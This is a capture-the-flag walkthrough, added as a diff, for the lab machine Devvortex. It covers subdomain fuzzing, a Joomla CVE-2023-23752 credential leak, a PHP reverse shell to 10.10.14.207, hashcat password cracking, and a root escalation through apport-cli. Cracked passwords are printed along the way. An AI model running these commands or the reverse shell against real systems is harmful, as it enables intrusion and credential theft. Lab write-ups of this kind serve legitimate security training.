@@ -1,0 +1,64 @@
+this box showed an ssh and webserver
+
+on the page there wasnt a lot,
+
+so bruteforcing the subdomains with ffuf:
+ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://{domain} -H 'Host: FUZZ.{domain}' -fw 4 -t 100
+found a subdomain dev.devvortex.htb
+
+then trying to bruteforce the directories with ffuf:
+ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FFUZ -u http://dev.devvortex.htb -H 'Host: http://dev.devvortex.htb/FFUZ' -ic -t 100
+
+found the administrator page
+on this page we know it runs joomla
+
+here we can find the version and a list of the files:4.2.6
+/administrator/manifests/files/joomla.xml
+
+searching for the version there is a known exploit for it
+https://github.com/Acceis/exploit-CVE-2023-23752
+
+running it we get the user and password
+ruby exploit.rb http://dev.devvortex.htb
+lewis:P4ntherg0t1n5r3c0n##
+
+logging in we can upload a reverse shell:
+system>site template
+create new file
+upload the reverse shell code
+
+then accessing it we get the shell:
+/templates/cassiopeia/test.php
+
+and we find a user logan
+
+using this web shell we upgrade it with a reverse shell
+
+sudo /usr/bin/php -r '$sock=fsockopen("10.10.14.207",1234);exec("/bin/sh <&3 >&3 2>&3");'
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+then we can connect with the local mysql database
+mysql -u lewis -h dev.devvortex.htb -p
+show databases;
+use joomla;
+show tables;
+describe sd4fg_users;
+select username, password from sd4fg_users;
+
+using hashcat we can crack the password
+echo {hash}> hash.txt
+hashcat -m 3200 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
+logan:tequieromucho
+
+then we can ssh into the box
+
+sudo -l we can execute /usr/bin/apport-cli
+
+searching for an exploit we find:
+https://github.com/diego-tella/CVE-2023-1326-PoC
+
+we just needed to create a crash file in /var/crash/acrashfile.crash
+press v
+and where in a vim instance and then !/bin/bash
+
+and get a root shell
